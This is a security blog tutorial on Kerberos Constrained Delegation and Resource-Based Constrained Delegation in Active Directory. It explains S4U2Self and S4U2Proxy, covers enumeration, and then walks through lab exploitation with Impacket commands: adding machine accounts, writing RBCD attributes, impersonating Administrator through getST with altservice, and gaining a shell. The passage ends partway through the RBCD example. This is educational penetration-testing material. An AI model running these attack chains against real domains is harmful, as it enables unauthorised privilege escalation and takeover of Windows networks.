---
id: "constrained-delegation-y-resource-based-constrained-delegation"
title: "Constrained Delegation and Resource-Based Constrained Delegation (RBCD) - Kerberos"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2024-04-15
updatedDate: 2024-04-15
image: "https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-0.webp"
description: "Complete guide on Constrained Delegation and Resource-Based Constrained Delegation (RBCD) in Kerberos, including S4U2Proxy and S4U2Self extensions, enumeration, and exploitation techniques."
categories:
  - "active-directory"
draft: false
featured: false
lang: "en"
---

We previously discussed [Unconstrained Delegation](/en/posts/unconstrained-delegation-kerberos/) in another article, and thanks to that, we know that delegation is an existing mechanism in Kerberos for credential delegation and user impersonation in an Active Directory.

Because unconstrained delegation was too insecure, Microsoft decided to launch two more secure options: Constrained Delegation and Resource-Based Constrained Delegation, also known as RBCD.

However, the fact that they are more secure options doesn't eliminate the possibility that they can be leveraged by an attacker. Therefore, in this article we're going to see how both delegations work along with exploitation examples ;)

In any case, the true purpose of this article is to obtain sufficient foundation not only to understand the topic itself, but also to have a solid base that allows you to read other articles on the subject without difficulty.

> Before reading this article, it's important that you not only know how Kerberos works, but that you've also seen and understand how unconstrained delegation works. There are articles on both topics in the blog:
> 
> - [Humble Attempt to Explain Kerberos](/en/posts/humilde-intento-de-explicar-kerberos/)
> - [Unconstrained Delegation – Kerberos](/en/posts/unconstrained-delegation-kerberos/)

- [Constrained Delegation](#constrained-delegation)
- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
- [Extensions - S4U2Proxy and S4U2Self](#extensions---s4u2proxy-and-s4u2self)
- [S4U2Proxy](#s4u2proxy)
- [S4U2Self](#s4u2self)
- [Bypassing msDS-AllowedToDelegateTo?](#bypassing-msds-allowedtodelegateto)
- [Enumeration](#enumeration)
    - [Enumeration from Linux](#enumeration-from-linux)
    - [Enumeration from Windows](#enumeration-from-windows)
- [Important Details for Exploitation](#important-details-for-exploitation)
    - [Impacket Versions](#impacket-versions)
    - [Service Types](#service-types)
    - [Kerberos Principal Name](#kerberos-principal-name)
- [Exploitation Time :)](#exploitation-time-)
    - [Constrained Delegation](#constrained-delegation-1)
        - [Without Protocol Transition](#without-protocol-transition)
        - [With Protocol Transition](#with-protocol-transition)
    - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
- [Interesting Articles (but not better than this one, obviously)](#interesting-articles-but-not-better-than-this-one-obviously)
- [References](#references)

## Constrained Delegation

Constrained Delegation limits which services an account can be delegated to. It's configured through the msds-allowedtodelegateto property that can be found in the attributes of a service account object.

> A service account refers to both a normal user account and a computer account, since both can have services associated with them. Additionally, a normal user account is not considered a service account until it has SPNs associated with it. Therefore, we're talking about: normal accounts that run services, and computer accounts which by default already have services under their control.

Let's enumerate both types of service users:

- User account with Constrained Delegation permission

![User account with Constrained Delegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-1.avif)

The service user jon.snow (user account) allows delegation only and exclusively to the CIFS service running on the WINTERFELL$ machine.

This means that if a user authenticates against any of the services running under jon.snow:

![SPNs associated with jon.snow](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-2.avif)

Any of these services will be able to impersonate the authenticated user in the CIFS service of WINTERFELL$ (as established in the value of the msds-allowedtodelegateto field from the first image).

- Computer account with Constrained Delegation permission

![Computer account with Constrained Delegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-3.avif)

The service user CASTELBLACK$ (computer account) allows delegation only and exclusively to the HTTP service of the WINTERFELL$ machine.

This again means that if a user authenticates against any of the services running under CASTELBLACK$:

![SPNs associated with CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-4.avif)

Any of these services will be able to impersonate the authenticated user in the HTTP service of WINTERFELL$ (again, as established in the value of the msds-allowedtodelegateto field).

Although we'll see this more technically later, in short it's the following:

1. I authenticate to SERVICE A
2. SERVICE A tells the DC that it wants to impersonate me in RESOURCE B (SERVICE B)
3. The DC checks the list (msds-allowedtodelegateto) of SERVICE A
4. If SERVICE B is present, then the DC allows the impersonation.

<figure>

![Constrained Delegation diagram](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-5.avif)

<figcaption>

Source: https://en.hackndo.com/constrained-unconstrained-delegation/

</figcaption>

</figure>

## Resource-Based Constrained Delegation (RBCD)

On the other hand, Resource-Based Constrained Delegation (RBCD) works differently. If we look at any of the two examples we've seen in Constrained Delegation, we can observe that the delegation configuration is held, so to speak, by the intermediate server. For example:

- USER --> SERVICE A --> SERVICE B (RESOURCE)

Who would have the SPN list where delegation is allowed would be the account that runs SERVICE A. In the jon.snow example it would be such that:

1. A user robb.stark authenticates to the CIFS service of THEWALL$.
2. This service runs under the user jon.snow, which has delegation configured for the CIFS service of WINTERFELL$.
3. Therefore, the CIFS service of THEWALL$ will be able to impersonate the user robb.stark in the CIFS service of WINTERFELL$.

In this case, who has the power is ultimately whoever manages the intermediate service. However, in Resource-Based Constrained Delegation (RBCD) it's the opposite: who decides who can delegate against it is the resource itself, that is, SERVICE B from the first example or, referring to the last one, it would be held by the CIFS service of WINTERFELL$.

The RBCD configuration is done in the msDS-AllowedToActOnBehalfOfOtherIdentity property. This property must have as its value a list of service users that are allowed to delegate against itself.

A practical example would be:

1. User Draco authenticates to the HTTP service of SERVER-WEB.
2. SERVER-WEB says, okay, I want to impersonate Draco in a service running on SERVER-BACKEND.
3. Here, when SERVER-WEB asks the DC that it wants to impersonate user Draco in SERVER-BACKEND, the DC says, okay, is SERVER-WEB in the list (msDS-AllowedToActOnBehalfOfOtherIdentity) of SERVER-BACKEND?
4. If it is, I allow it. If it's not, I don't allow it.

As apparently simple as that.

> To make the note although it has already been said, in Constrained Delegation the list corresponds to SPNs. While in RBCD, the list corresponds to service accounts.

> On the other hand, it's important to know that any service account has permissions to configure its own RBCD, that is, any service account can edit its own msDS-AllowedToActOnBehalfOfOtherIdentity field. In Constrained Delegation, the configuration is done by administrators.
> 
> Likewise, any domain account that has GenericAll, GenericWrite, or WriteProperty privileges on a service account, will be able to configure RBCD on that service account.

All this, graphically would be:

1. I authenticate to SERVICE A
2. SERVICE A tells the DC that it wants to impersonate me in RESOURCE B (SERVICE B)
3. The DC checks the list (msDS-AllowedToActOnBehalfOfOtherIdentity) of RESOURCE B (SERVICE B).
4. If the service account of SERVICE A is present in the list, SERVICE B will allow the impersonation

<figure>

![RBCD diagram](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-6.avif)

<figcaption>

Source: https://en.hackndo.com/constrained-unconstrained-delegation/

</figcaption>

</figure>

## Extensions - S4U2Proxy and S4U2Self

We've already seen the main ideas behind Constrained Delegation and Resource-Based Constrained Delegation (RBCD). However, this doesn't end here because we still haven't talked about how it's carried out and how it's possible for both delegations to be allowed, technically speaking. To understand everything well, now we need to talk about the following:

- S4U2Proxy
- S4U2Self

These two names correspond to extensions of the Kerberos protocol that were created along with Constrained Delegation. Thanks to these two extensions, everything mentioned so far can work.

## S4U2Proxy

This extension basically consists of the possibility that from one TGS, another TGS can be requested for the same user but for a different service.

I'm going to bring the following example from the beginning:

![CASTELBLACK Constrained Delegation example](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-7.avif)

In this case, in a simple way, let's imagine that a user Draco authenticates to a service run by CASTELBLACK$ and this service can impersonate Draco in the HTTP service of WINTERFELL$. Let's break down this process more technically:

1. User Draco requests a TGS (KRB_TGS_REQ request) for one of the services run by the computer account CASTELBLACK$, let's assume it's the HOST service.
2. User Draco receives the TGS from the DC and uses it to authenticate to the HOST service of CASTELBLACK$.
3. The HOST service of CASTELBLACK$ has received the TGS from user Draco for its service. Now, the HOST service wants to impersonate user Draco in the HTTP service of WINTERFELL$.
4. To do this, CASTELBLACK$ will make a request to the DC to ask for a TGS on behalf of user Draco for the HTTP service of WINTERFELL$ (again, a KRB_TGS_REQ request).
5. This KRB_TGS_REQ request that CASTELBLACK$ makes is a bit different because two attributes are set:
    - additional-tickets: is a normally empty field that must contain the TGS that the HOST service itself received from Draco.
    - cname-in-addl-tkt: is a flag that is defined in the [kdc-options field from Microsoft](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/klist) indicating that the DC should not use the server's information but the information from the TGS found in the additional-tickets field.
6. Once the DC receives this request, it will verify if CASTELBLACK$ has the corresponding permission to authenticate to the HTTP service of WINTERFELL$ on behalf of another user.

This entire procedure applies to both Constrained Delegation and Resource-Based Constrained Delegation (RBCD). In both cases, S4U2Proxy is used to request tickets on behalf of the user. The difference lies in how the Key Distribution Center (KDC) (aka the domain controllers) verifies permissions:

- In Constrained Delegation, the KDC verifies the msDS-AllowedToDelegateTo attribute of the requesting service account to determine if it's authorized to obtain a ticket for the target service on behalf of the user.

- In RBCD, the KDC verifies the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the target service to determine if it allows the requesting service account to act on behalf of the user.

In conclusion and what we need to remember is that the S4U2Proxy extension allows, from a user's TGS, to request another TGS for the same user but a different service. Likewise, this extension is always present because it handles the very idea of what delegation is.

## S4U2Self

Now let's see the second extension, S4U2Self. This extension is the one that can give more play and therefore perhaps be the most dangerous because basically what it allows is for a service account to request a TGS on behalf of any user, whichever one it wants.

Since this extension gives so much freedom, so to speak, it's not present in any situation, only in the following cases:

- When RBCD is used.
- When in Constrained Delegation, the use of any protocol is enabled and not only Kerberos, this is known as Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION):

![Protocol Transition enabled](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-8.avif)

> Technically, S4U2Self within the context of Constrained Delegation is always present, whatever the situation (whether the TrustedToAuthForDelegation flag of Protocol Transition is present or not).
> 
> The thing is that in the two situations above, the TGS obtained will have the "forwardable" flag enabled, so the TGS will be forwardable through S4U2Proxy. In any other situation, S4U2Self can be used, but the TGS will not be forwardable.

What is this? Well, basically imagine the following situation:

- What happens if a user authenticates to service A that doesn't use Kerberos, but service B does use it?

In this case, service A doesn't have a TGS to include in the alleged KRB_TGS_REQ request it has to make because the user didn't give it to them by not using Kerberos in the authentication.

This situation is known as the double-hop problem and because of this, the S4U2Self extension exists, so in this case service A can use it and request a TGS on behalf of this user despite not having their TGS.

- This KRB_TGS_REQ request will define in the PA-FOR-USER field the name of the user whose TGS is wanted.

So, returning to Protocol Transition, when we enable it, the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is enabled in the service account. An example of the jon.snow account:

![TRUSTED_TO_AUTH_FOR_DELEGATION flag in jon.snow](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-9.avif)

For these two cases we mentioned at the beginning, this is when S4U2Self will be present. To show the dangerousness of this extension briefly, a couple of examples with the two types of cases where it can occur.

- Constrained Delegation with Protocol Transition

Imagine you get hold of a service account that has the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag, that is, it has Protocol Transition enabled.

Well basically, you'll be able to request a TGS on behalf of any user (Administrator for example) and, in addition, using S4U2Proxy, you can request it for any service that is established in the msds-allowedtodelegateto field.

Therefore, you haven't only compromised that service account, but all the services which are allowed in the delegation.

- RBCD

This exploitation case is perhaps a little more complex. Imagine you get a user that has GenericAll or GenericWrite permissions on a service account. Well, you can use this user to modify the value of the msDS-AllowedToActOnBehalfOfOtherIdentity field and add a service account of yours.

> The most normal thing would be a computer account in any case because by default any domain user can add up to 10 computer accounts to the domain. All of course assuming this value hasn't been modified to 0 by administrators. Additionally, computer accounts by default have associated services.

If using that user with permissions, you add to the RBCD property an account managed by you. You'll then be able to make use of S4U2Proxy and S4U2Self to obtain a TGS on the target service account as any user.

Likewise, hey, if the target account itself is already an account with Constrained Delegation configured, you won't only compromise the target account, but all the services that are configured in Constrained Delegation.

Perhaps this case is a bit more difficult to understand at first, but we're going to see them all practically.

Graphically, it would look like this:

<figure>

![S4U2Self and S4U2Proxy diagram](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-10.avif)

<figcaption>

Source: https://en.hackndo.com/constrained-unconstrained-delegation/

</figcaption>

</figure>

## Bypassing msDS-AllowedToDelegateTo?

Let's remember that msDS-AllowedToDelegateTo is the Constrained Delegation property where we place the SPN of the services we want to allow delegation to. Now, how is it a bypass?

Well basically it was discovered that when you obtain a TGS for a service, you can modify the TGS locally (for example, change HOST to CIFS) to access another service.

The only requirement is that both services run under the same user.

About this, you can find the [original article about Kerberos Delegation and SPNs from SecureAuth](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/).

Apparently this occurrence was reported to Microsoft and they responded something like:

![It's not a bug, it's a feature](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-11.avif)

So basically, if in a Constrained Delegation a delegation is configured to, for example, the CIFS service of WINTERFELL$.

Spoiler: it's not only CIFS the service to which delegation is allowed. Again, as long as the other service we place runs under the same user context. Because in this way the same encryption key is shared for the TGS.

> Access control is based on this key and not on strict validation of the SPN in the Ticket. So by modifying the sname field in the Ticket, it's possible to make the TGS appear to be destined for another service under the same user.

## Enumeration

Before seeing different exploitation cases, let's see how we can enumerate delegations in the active directory.

##### Enumeration from Linux

From Linux, we can use the Impacket findDelegation script to enumerate all delegations:

```bash
impacket-findDelegation <domain fqdn>/<user>:<password> -target-domain <domain fqdb>
```

![Delegation enumeration with findDelegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-12.avif)

In this case we get any type of delegation, whether restricted (Constrained) or even unrestricted (Unconstrained).

##### Enumeration from Windows

Based on the fact that any information can be enumerated through LDAP. From Windows we can use, for example, Powerview to quickly enumerate both Constrained Delegation and RBCD.

- Constrained Delegation Enumeration

Here you must enumerate both normal user accounts and computer accounts:

```powershell
Get-DomainUser -TrustedToAuth
```

<figure>

![Constrained Delegation enumeration on normal user accounts](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-13.avif)

<figcaption>

Constrained Delegation enumeration on normal user accounts

</figcaption>

</figure>

```powershell
Get-DomainComputer -TrustedToAuth
```

<figure>

![Constrained Delegation enumeration on computer accounts](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-14.avif)

<figcaption>

Constrained Delegation enumeration on computer accounts

</figcaption>

</figure>

- Resource-Based Constrained Delegation Enumeration

Again, we can use Powerview to enumerate service accounts that have RBCD.

```powershell
Get-DomainUser | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}

Get-DomainComputer | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
```

![RBCD enumeration with PowerView](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-15.avif)

In this case one is returned to us, and if we notice, the value of msDS-AllowedToActOnBehalfOfOtherIdentity is not readable. To automate the entire RBCD enumeration process and also obtain the clear name of the object, we can use the following script:

```powershell
# Define a function to process AD objects (users and computers)
function Process-ADObjectWithRBCD {
    param(
        [Parameter(Mandatory = $true)]
        $ADObject
    )
    Write-Output "Processing object: $($ADObject.name)"
    $binaryValue = $ADObject.'msDS-AllowedToActOnBehalfOfOtherIdentity'
    
    # Convert the binary value to a security descriptor
    $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $binaryValue, 0

    # Show security descriptor information
    $sd.DiscretionaryAcl | ForEach-Object {
        $sid = $_.SecurityIdentifier.ToString()
        # Try to convert the SID to an object name using ConvertFrom-SID
        try {
            $objectName = ConvertFrom-SID $sid
            Write-Output "SID: $sid has object name: $objectName"
        } catch {
            Write-Output "SID: $sid could not be converted to an object name."
        }
        Write-Output "Access Mask: $($_.AccessMask)"
        Write-Output "Ace Type: $($_.AceType)"
        Write-Output "---------------------------"
    }
    Write-Output "======================================="
}

# Get and process all computers in the domain with RBCD configured
$computersWithRBCD = Get-DomainComputer | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
foreach ($computer in $computersWithRBCD) {
    Process-ADObjectWithRBCD -ADObject $computer
}

# Get and process all users in the domain with RBCD configured
$usersWithRBCD = Get-DomainUser | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
foreach ($user in $usersWithRBCD) {
    Process-ADObjectWithRBCD -ADObject $user
}
```

If we run it:

![RBCD enumeration script result](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-16.avif)

It tells us in this case that the CASTELBLACK object allows RBCD delegation to the rbcd_const$ object. Both in this case are computer accounts.

In addition to what we've seen, it's also possible to enumerate delegations from Bloodhound using queries. You can consult the [BloodHound Cypher Cheatsheet from Hausec](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/).

Filter by Delegation and you'll find several options as it suits you.

## Important Details for Exploitation

###### Impacket Versions

Pay close attention to the Impacket versions and the branch you're using, since depending on this, some arguments may not be available for certain tools. For example, in my case:

- If I run impacket-getST

![impacket-getST version](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-17.avif)

I use version 0.11.0 and have available the arguments that appear in the help panel.

- If I run getST.py

![getST.py development branch version](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-18.avif)

I use the Impacket development branch, and have some more arguments available.

###### Service Types

I'll leave an orientation table to observe what actions we can execute according to the services for which we have Tickets.

| SERVICE TYPES | SERVICE TICKETS |
| --- | --- |
| WMI | HOST   RPCSS |
| PowerShell Remoting | HOST   HTTP   Depending on the operating system also:   WSMAN   RPCSS |
| WinRM | HOST   HTTP   Sometimes you only need:   WINRM |
| Scheduled Tasks | HOST |
| Windows File Share, also psexec | CIFS |
| LDAP operations, including DCSync | LDAP |
| Windows Remote Server Administration Tools | RPCSS   LDAP   CIFS |
| Golden Tickets | krbtgt |

###### Kerberos Principal Name

When exploiting, we're going to request multiple service tickets and we're going to use them. And an important detail of this is that the Principal Name used to request the ticket must be the same as when it's going to be used.

Practical example to understand:

If I request a ticket for the Principal Name kingslanding.sevenkingdoms.local:

![Ticket request with FQDN](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-19.avif)

And I try to use it specifying only kingslanding, it won't work:

![Error using ticket with short name](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-20.avif)

However, if I specify the same Principal Name as when requesting the ticket, that is, kingslanding.sevenkingdoms.local:

![Correct ticket usage with FQDN](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-21.avif)

It will work.

In the same way, if I request a ticket for the Principal Name kingslanding:

![Ticket request with short name](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-22.avif)

And I try to use it specifying the full Principal Name (kingslanding.sevenkingdoms.local), it won't work:

![Error using ticket with FQDN](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-23.avif)

Again, if I specify the same Principal Name as when requesting the ticket, that is, kingslanding:

![Correct ticket usage with short name](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-24.avif)

It will work :)

Therefore, be careful with this when it comes to exploitation.

## Exploitation Time :)

It's time to see in a practical way all the concepts seen in this article. For this we're going to see exploitation examples for both Constrained Delegation and Resource-Based Constrained Delegation.

![Delegations configured in the lab](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-25.avif)

Here exploitation examples will be shown, but not all possible tools that can be used to perform these exploitations. For that there are already cheatsheets with all the possibilities and having understood the topic, it won't be a problem for us to use them.

Even so, some other tool related to this, just to mention, would be Rubeus and Kekeo.

#### Constrained Delegation

###### Without Protocol Transition

Let's start by seeing what the exploitation of Constrained Delegation without Protocol Transition would look like, that is, the configuration would be as follows:

![Constrained Delegation configuration without Protocol Transition](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-26.avif)

Within the two possible cases of Constrained Delegation, this is the most "complicated" but let's see how it would be.

The situation is basically that the CASTELBLACK$ computer has Constrained Delegation configured towards the HTTP service of the WINTERFELL$ computer.

And our objective is to be able to compromise WINTERFELL$.

To take advantage of this we need first of all:

- An account in the domain (which will serve us to add a computer account)
- Machine account of the CASTELBLACK$ computer, or on the contrary, a domain account that has sufficient privileges to be able to edit the msDS-AllowedToActOnBehalfOfOtherIdentity field of CASTELBLACK$ (that is, GenericAll, GenericWrite, or WriteProperty permissions on CASTELBLACK$)

So, the idea to exploit this is basically:

1. Add a computer account using our user (remember that by default in an AD, the MachineAccountQuota field is set to 10, so any domain user can add up to 10 computer accounts).
2. Edit the msDS-AllowedToActOnBehalfOfOtherIdentity field in CASTELBLACK$, that is, we'll help ourselves with RBCD to compromise WINTERFELL$ through Constrained Delegation. When editing the field in CASTELBLACK$, we'll add the computer account we just created as a trusted account. So, from our computer account, we can make use of S4U2Self and S4U2Proxy, and subsequently from CASTELBLACK$ of S4U2Proxy to make the jump to WINTERFELL$.

Having that clear, let's go:

As we said, we add a computer account with our domain user:

```bash
impacket-addcomputer -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.50.11 'north.sevenkingdoms.local/arya.stark:Needle'
```

![Computer account creation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-27.avif)

From the DC we can view the account we just added:

![Computer account created in the DC](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-28.avif)

Now, let's assume we've compromised CASTELBLACK$ and we obtain the LSA to get the NT hash of the computer account itself:

![LSA dump on CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-29.avif)

![CASTELBLACK NT hash](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-30.avif)

Having the CASTELBLACK$ computer account, we're going to edit its own msDS-AllowedToActOnBehalfOfOtherIdentity field value to add the computer account we created, rbcd_const$:

```bash
impacket-rbcd -delegate-from 'rbcd_const$' -delegate-to 'castelblack$' -dc-ip 192.168.50.11 -action 'write' -hashes ':98d47d3d7e5be6ad987e05716fe42e14' north.sevenkingdoms.local/'castelblack$'
```

![RBCD configuration on CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-31.avif)

If we now view the attributes of CASTELBLACK$'s field:

![CASTELBLACK attributes with RBCD configured](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-32.avif)

![msDS-AllowedToActOnBehalfOfOtherIdentity field detail](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-33.avif)

We see that the field has been edited perfectly.

Okay, well with this we can now do everything:

We make use of S4U2Self and S4U2Proxy to obtain from the rbcd_const$ computer account, a TGS as Administrator for the HOST service of CASTELBLACK$:

```bash
getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 192.168.50.11 north.sevenkingdoms.local/'rbcd_const$':'rbcdpass'
```

![TGS obtaining with S4U](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-34.avif)

When we already have a forwardable TGS, we can make use of S4UProxy to request it in WINTERFELL$. Likewise, we make use of what was mentioned in [bypassing msDS-AllowedToDelegateTo](#bypassing-msds-allowedtodelegateto) to modify the destination service in WINTERFELL$ so it's not HTTP as originally established in the Constrained Delegation:

```bash
getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket 'Administrator@host_castelblack@NORTH.SEVENKINGDOMS.LOCAL.ccache' -dc-ip 192.168.50.11 -hashes ':98d47d3d7e5be6ad987e05716fe42e14' north.sevenkingdoms.local/'castelblack$'
```

![TGS for WINTERFELL CIFS](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-35.avif)

With this, we've just obtained a TGS for the CIFS service of WINTERFELL$ as Administrator. We can make use of it by adding it to the KRB5CCNAME environment variable. Once added, we can use whatever we want as long as we have access with the CIFS service:

```bash
export KRB5CCNAME=/home/draco_0x6ba/administrator@cifs_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache

wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

![TGS usage with wmiexec](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-36.avif)

![Shell as Administrator on WINTERFELL](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-37.avif)

###### With Protocol Transition

We've already seen what the exploitation would be without Protocol Transition, let's now see what it would be like when this feature is enabled:

![Constrained Delegation with Protocol Transition](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-38.avif)

In this case, user jon.snow has Constrained Delegation with Protocol Transition and has the CIFS service of WINTERFELL$ configured.

In this situation, there's no need to mess around using RBCD as in the previous case. Since by default, we can already make use of S4U2Self through Protocol Transition, well, with a simple command we can obtain a TGS for the service we want from WINTERFELL$:

```bash
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.50.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

![TGS with Protocol Transition](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-39.avif)

In this case we requested it for CIFS itself. If we wanted another service we'd simply have to use the -altservice argument:

```bash
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -altservice 'HOST/winterfell' -dc-ip '192.168.50.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

![TGS with altservice](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-40.avif)

Whatever it is, once we have the TGS we do the same as before, we set the KRB5CCNAME environment variable, and use the ticket:

```bash
export KRB5CCNAME=/home/draco_0x6ba/Administrator@CIFS_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache

smbclient.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

![SMB access to WINTERFELL](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-41.avif)

And in this way we will have exploited a Constrained Delegation with Protocol Transition :)

#### Resource-Based Constrained Delegation

Last but not least, let's exploit RBCD :)

Its exploitation is similar to the first case of Constrained Delegation. The situation we're going to exploit is the following:

![RBCD situation to exploit](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-42.avif)

The requirements for this exploitation are the same as in Constrained Delegation without Protocol Transition:

- An account in the domain (which will serve us to add a computer account)
- Machine account of the KINGSLANDING$ computer, or on the contrary, a domain account that has sufficient privileges to be able to edit the msDS-AllowedToActOnBehalfOfOtherIdentity field of KINGSLANDING$ (that is, GenericAll, GenericWrite, or WriteProperty permissions on KINGSLANDING$)

In this case, we're going to see the second example of the second requirement. We have the stannis.baratheon account which has GenericAll permissions on KINGSLANDING$.

First of all, we'll add a computer account, using the stannis.baratheon user:

```bash
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'
```

![Computer account creation for RBCD](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-43.avif)

Once we already have a computer account added, the idea is to take advantage of the GenericAll permission we have on KINGSLANDING$ to add to the msDS-AllowedToActOnBehalfOfOtherIdentity field the computer account we just created.

```bash
rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
```

